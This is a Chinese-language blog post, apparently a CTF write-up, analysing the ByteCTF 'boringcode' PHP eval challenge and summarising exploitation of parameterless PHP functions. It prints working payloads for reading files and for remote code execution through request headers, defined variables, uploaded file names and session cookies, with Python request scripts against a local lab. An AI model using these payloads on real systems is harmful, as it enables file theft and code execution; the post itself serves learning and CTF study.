@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            ByteCTF一道题的分析与学习PHP无参数函数的利用
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B4%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-text">说在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#boringcode"><span class="toc-text">boringcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%82%B9%EF%BC%9A"><span class="toc-text">第一个点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E7%82%B9%EF%BC%9A"><span class="toc-text">第二个点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93"><span class="toc-text">无参数函数的利用总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">获取环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getallheaders-gt-RCE"><span class="toc-text">getallheaders() &#x3D;&gt; RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-defined-vars-gt-RCE"><span class="toc-text">get_defined_vars() &#x3D;&gt; RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session-id-gt-RCE"><span class="toc-text">session_id() &#x3D;&gt; RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E5%B0%8F%E6%80%BB%E7%BB%93"><span class="toc-text">无参数函数小总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>这次参与了ByteCTF，尝试做了boringcode和EZCMS。虽然都没做出来，但是学到了很多东西。</p>
+<p>这次通过ALTM4NZ师傅的wp来分析一下boringcode这道题并学习一下无参数函数的利用。</p>
+<h2 id="boringcode"><a href="#boringcode" class="headerlink" title="boringcode"></a>boringcode</h2><p>看一下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var(<span class="variable">$url</span>, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/data:\/\//i&#x27;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url(<span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="variable">$r</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/baidu\.com$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$code</span> = file_get_contents(<span class="variable">$url</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;bye~&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error: host not allowed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error: invalid url&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个页面的作用是，接受一个url参数，利用file_get_content远程获取url页面的源码，传递给eval执行。但在url传递和源码传递过程中有各种检测。</p>
+<a id="more"></a>
+<h3 id="第一个点："><a href="#第一个点：" class="headerlink" title="第一个点："></a>第一个点：</h3><ol>
+<li>is_valid_url()函数来检测url的正确性，并禁止使用data协议。</li>
+<li>url的host必须以baidu.com结尾。</li>
+</ol>
+<p>绕过：</p>
+<p>如果data协议没有被绕过，则可以使用：<code>data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=</code> 来进行绕过。</p>
+<p>这里把data协议禁止了之后，想要利用伪协议绕过的话近乎无解。只想到购买域名来进行绕过，比如threezh1baidu.com。 (还好没买! 买了也做不出来。)</p>
+<h3 id="第二个点："><a href="#第二个点：" class="headerlink" title="第二个点："></a>第二个点：</h3><ol>
+<li>由<code>preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;</code>可知，这里只允许无参数的函数传递进来。并且函数名只能为字母，不能包含下划线等其他特殊字符。</li>
+<li>过滤了很多的关键字：<code>et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log</code></li>
+</ol>
+<p>这里绕过没做出来，学习大佬是怎么做这题的。</p>
+<p>绕过：</p>
+<p><code>preg_replace(&#39;/[a-z]+\((?R)?\)/&#39;</code>虽然只允许无参数，但是允许函数套用。正则表达式匹配情况：</p>
+<p><img src="https://i.loli.net/2019/09/15/jOkhe2V7z8w4U6G.jpg" alt="zhengze01.jpg"></p>
+<p><img src="https://i.loli.net/2019/09/15/JhI3Ny8GPdl9Z7L.jpg" alt="zhengze02.jpg"></p>
+<p><img src="https://i.loli.net/2019/09/15/gGmqzhT8APHunaN.jpg" alt="zhengze03.jpg"></p>
+<p>通过这样的嵌套，就能构造出payload进行读取文件操作，在特殊情况下还可以进行RCE。这题只能读取文件。</p>
+<ul>
+<li><strong>第一种方式：</strong></li>
+</ul>
+<p>参考：<a target="_blank" rel="noopener" href="http://peanuts2ao.top/2019/09/09/2019-ByteCTF-pwn/">ByteCTF_WEB</a></p>
+<p>来看这个师傅的Payload：</p>
+<p><code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</code></p>
+<p>payload很长，第一次看的的时候吓了一跳。 来看看他是怎么通过这个payload获取到flag了吧。</p>
+<p>因为环境已经关了，所以我在在本地搭了一个环境。 </p>
+<p>WWW/flag  flag文件</p>
+<p>WWW/code/code.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">	<span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">	        <span class="keyword">echo</span> <span class="string">&#x27;bye~&#x27;</span>;</span><br><span class="line">	    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;No No No&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>先来看这几个函数：</p>
+<pre><code>scandir()    列出 images 目录中的文件和目录。
+end()        将内部指针指向数组中的最后一个元素，并输出。
+readfile()  输出一个文件</code></pre>
+<p>scandir()接受一个目录地址的参数，当传递为一个”.”时，则会返回一个数组包含当前目录下的目录名和文件名。</p>
+<p>那构造<code>readfile(end(scandir(&#39;.&#39;)));</code>就会读取到当前目录下最后一个文件。</p>
+<p>如果把函数参数检测关掉的话，返回的内容为code.php的源码：</p>
+<p><img src="https://i.loli.net/2019/09/15/MYdEGq9et7SRUsX.jpg" alt="yuanma01.jpg"></p>
+<p>这题因为不能附带参数，所以需要寻找一个函数能生成一个”.”。于是找到了</p>
+<pre><code>localeconv()   函数返回一包含本地数字及货币格式信息的数组。</code></pre>
+<p>这个函数会返回：</p>
+<pre><code>array(18) &#123;
+  [&quot;decimal_point&quot;]=&gt;
+  string(1) &quot;.&quot;
+  [&quot;thousands_sep&quot;]=&gt;
+  string(0) &quot;&quot;
+  [&quot;int_curr_symbol&quot;]=&gt;
+  ....</code></pre>
+<p>数组中第一个值就是”.”。再通过下面两个函数可以构造:<code>current(localeconv())</code>或者<code>pos(localeconv())</code>。因为这里还过滤en，所以就选择了后者。</p>
+<pre><code>current()        返回数组中的当前单元, 默认取第一个值
+pos()            current() 的别名 </code></pre>
+<p>这时，我们就可以获取到当前目录的最后一个文件了,payload为：</p>
+<p><code>readfile(end(scandir(pos(localeconv()))));</code></p>
+<p>因为flag是在上一个目录，所以我们还需要使用<code>chdir()</code> <code>next()</code>来重新定义一下php当前目录，再使用readfile进行读取文件。</p>
+<pre><code>chdir() 函数改变当前的目录。
+next() 函数将内部指针指向数组中的下一个元素，并输出。 这里可以获取到scandir()返回的&quot;..&quot;</code></pre>
+<p>将目录定义为上一目录：<code>chdir(next(scandir(pos(localeconv()))))</code></p>
+<p>但是chdir()函数执行成功之后不会返回当前目录，只会返回”1”。 如前面读文件一样，我们还是需要一个”.”来读取flag。</p>
+<p>ALTM4NZ师傅找到了一个很骚的操作，就是使用<code>localtime()</code>配合<code>chr</code>来获取一个”.”。</p>
+<pre><code>localtime() 函数返回本地时间。返回的类型为关联数组
+
+    关联数组的键名如下：
+
+    [tm_sec] - 秒数
+    [tm_min] - 分钟数
+    [tm_hour] - 小时
+    ...
+
+chr() 函数从指定的 ASCII 值返回字符。</code></pre>
+<p>获取”.”的payload：<code>chr(pos(localtime()))</code></p>
+<p>当时间为某一分钟的46秒时, pos(localtime())返回46。46是”.”的ASCII码值。所以payload就会返回”.”</p>
+<p>但这里存在一个问题就是localtime()参数只接受时间戳。</p>
+<p><img src="https://i.loli.net/2019/09/15/L76jp2Dg4aCJKVu.jpg" alt="localtime.jpg"></p>
+<p>所以这里需要使用time()来解决。time()不会受参数的影响并且会返回一个时间戳。</p>
+<p>至此，我们的payload就为：</p>
+<p><code>chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))</code></p>
+<p>在46秒的时候，就会返回”.”</p>
+<p><img src="https://i.loli.net/2019/09/15/xNwWGcYXgTE4B5y.jpg" alt="dian.jpg"></p>
+<p>再用前面读取文件的方式就可以在每分钟的46秒时读取到flag了。</p>
+<p><code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</code></p>
+<p><img src="https://i.loli.net/2019/09/15/RerdnaO2omz4xZG.jpg" alt="getflag.jpg"></p>
+<ul>
+<li><strong>第二种方式</strong></li>
+</ul>
+<p>这个payload是在群里面看到一个师傅发的。</p>
+<p><code>if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));</code></p>
+<p>因为chdir()返回0和1，所以使用if来判断并执行后面语句进行读取文件。这样就不用使用localtime函数来获取”.”。可以直接读flag。</p>
+<p><img src="https://i.loli.net/2019/09/15/TqKNil54MIWwd2v.jpg" alt="getflag1.jpg"></p>
+<p>实现的函数在第一种方式都有。就不分析了。</p>
+<h2 id="无参数函数的利用总结"><a href="#无参数函数的利用总结" class="headerlink" title="无参数函数的利用总结"></a>无参数函数的利用总结</h2><p>环境：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里正则表达式和题目的区别在于这里还运行函数名称包含<code>_</code>等特殊字符。</p>
+<h3 id="获取环境变量"><a href="#获取环境变量" class="headerlink" title="获取环境变量"></a>获取环境变量</h3><p>使用getenv()获取超全局变量的数组，使用array_rand和array_flip爆破出所有的全局变量。</p>
+<pre><code>getenv()         获取一个环境变量的值(在7.1之后可以不给予参数)
+array_rand()     函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
+array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</code></pre>
+<p>payload:</p>
+<p><code>echo(array_rand(array_flip(getenv())));</code></p>
+<p><img src="https://i.loli.net/2019/09/15/JT8QBimcpEboLZD.jpg" alt="payload1.jpg"></p>
+<h3 id="getallheaders-gt-RCE"><a href="#getallheaders-gt-RCE" class="headerlink" title="getallheaders() =&gt; RCE"></a>getallheaders() =&gt; RCE</h3><pre><code>getallheaders()        获取全部 HTTP 请求头信息, 是下方函数的别名
+apache_request_headers    获取全部 HTTP 请求头信息
+这两个函数只适用于apache服务器</code></pre>
+<p>函数返回内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">array(11) &#123;</span><br><span class="line">  [&quot;Accept-Language&quot;]&#x3D;&gt;</span><br><span class="line">  string(23) &quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8&quot;</span><br><span class="line">  [&quot;Accept-Encoding&quot;]&#x3D;&gt;</span><br><span class="line">  string(17) &quot;gzip, deflate, br&quot;</span><br><span class="line">  [&quot;Accept&quot;]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;*&#x2F;*&quot;</span><br><span class="line">  [&quot;Content-Type&quot;]&#x3D;&gt;</span><br><span class="line">  string(68) &quot;multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryevLOjNPCJPGbsCBf&quot;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当我们构造一个Header时：</p>
+<p><img src="https://i.loli.net/2019/09/15/J3pxUcHf8mPziXl.jpg" alt="header1.jpg"></p>
+<p>添加一个Header为<code>test: phpinfo();</code>,根据位置选择合适的payload：</p>
+<ol>
+<li><p>添加在Header在第一个：</p>
+<p> payload: <code>code=eval(pos(getallheaders()));</code> </p>
+<p> (pos()可以换为current(). 如果在第二个可以使用next())</p>
+</li>
+<li><p>添加在Header在最后一个：</p>
+<p> payload: <code>code=eval(end(getallheaders()));</code></p>
+</li>
+<li><p>不知道位置：</p>
+<p> 配合<code>array_rand()</code>, <code>array_flip()</code>构造payload进行爆破：</p>
+<p> payload: <code>eval(array_rand(array_flip(getallheaders())));</code></p>
+</li>
+</ol>
+<p><img src="https://i.loli.net/2019/09/15/7j13wV54ZIsXxfr.jpg" alt="suijibaopo.jpg"></p>
+<h3 id="get-defined-vars-gt-RCE"><a href="#get-defined-vars-gt-RCE" class="headerlink" title="get_defined_vars() =&gt; RCE"></a>get_defined_vars() =&gt; RCE</h3><pre><code>get_defined_vars() 函数返回由所有已定义变量所组成的数组。</code></pre>
+<p>和getallheaders()利用类似，但是不止apache, ngnix和其他的也可以用</p>
+<p>函数返回内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;_GET&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_POST&quot;]&#x3D;&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [&quot;code&quot;]&#x3D;&gt;</span><br><span class="line">    string(29) &quot;var_dump(get_defined_vars());&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_COOKIE&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_FILES&quot;]&#x3D;&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会返回全局变量的值，如get、post、cookie、file数据。</p>
+<ol>
+<li>利用<code>$_GET</code></li>
+</ol>
+<p>url中添加参数：<a target="_blank" rel="noopener" href="http://127.0.0.1/code/code.php?test=phpinfo()">http://127.0.0.1/code/code.php?test=phpinfo()</a>;</p>
+<p>post数据：<code>eval(end(current(get_defined_vars())));</code></p>
+<p><img src="https://i.loli.net/2019/09/15/QZLUjoBDmVIGw6a.jpg" alt="getphpinfo.jpg"></p>
+<ol start="2">
+<li>利用<code>$_FILES</code></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&quot;system(&#x27;ping 127.0.0.1&#x27;);&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;code&quot;</span>:<span class="string">&quot;eval(pos(pos(end(get_defined_vars()))));&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">&#x27;http://127.0.0.1/code/code.php&#x27;</span>, data=data, files=files)</span><br><span class="line">print(r.content.decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>把payload直接放在文件的名称上，再通过两个pos定位进行利用。</p>
+<p>也可以像sky师傅脚本里面那样进行编码，使用hex2bin()解码利用。</p>
+<p><img src="https://i.loli.net/2019/09/15/gUfjpJoySZiwHMh.jpg" alt="filephpinfo.jpg"></p>
+<h3 id="session-id-gt-RCE"><a href="#session-id-gt-RCE" class="headerlink" title="session_id() =&gt; RCE"></a>session_id() =&gt; RCE</h3><pre><code>session_id() 可以用来获取/设置 当前会话 ID。</code></pre>
+<p>可以通过修改cookie来设置session，用<code>session_id()</code>读取进行利用。</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;system(&#x27;ping 127.0.0.1&#x27;);&quot;</span></span><br><span class="line">payload = <span class="built_in">str</span>(binascii.b2a_hex(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>))).strip(<span class="string">&quot;b&quot;</span>).strip(<span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line">	<span class="string">&quot;PHPSESSID&quot;</span>: payload</span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;code&quot;</span>:<span class="string">&quot;eval(hex2bin(session_id(session_start())));&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">&#x27;http://127.0.0.1/code/code.php&#x27;</span>, data=data, cookies=cookies)</span><br><span class="line">print(r.content.decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/15/tARoWnCeYXZDVKb.jpg" alt="session.jpg"></p>
+<h3 id="无参数函数小总结"><a href="#无参数函数小总结" class="headerlink" title="无参数函数小总结"></a>无参数函数小总结</h3><p>这里是针对无参数函数利用来说的。</p>
+<pre><code>getchwd() 函数返回当前工作目录。
+scandir() 函数返回指定目录中的文件和目录的数组。
+dirname() 函数返回路径中的目录部分。
+chdir() 函数改变当前的目录。
+
+readfile()  输出一个文件
+
+current()       返回数组中的当前单元, 默认取第一个值
+pos()           current() 的别名
+next() 函数将内部指针指向数组中的下一个元素，并输出。
+end()       将内部指针指向数组中的最后一个元素，并输出。
+array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
+array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
+
+chr() 函数从指定的 ASCII 值返回字符。
+hex2bin — 转换十六进制字符串为二进制字符串
+
+getenv()        获取一个环境变量的值(在7.1之后可以不给予参数)</code></pre>
+<p>常见的就这么一些。先记录到这吧。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="http://peanuts2ao.top/2019/09/09/2019-ByteCTF-pwn/">http://peanuts2ao.top/2019/09/09/2019-ByteCTF-pwn/</a></li>
+<li><a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></li>
+</ul>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
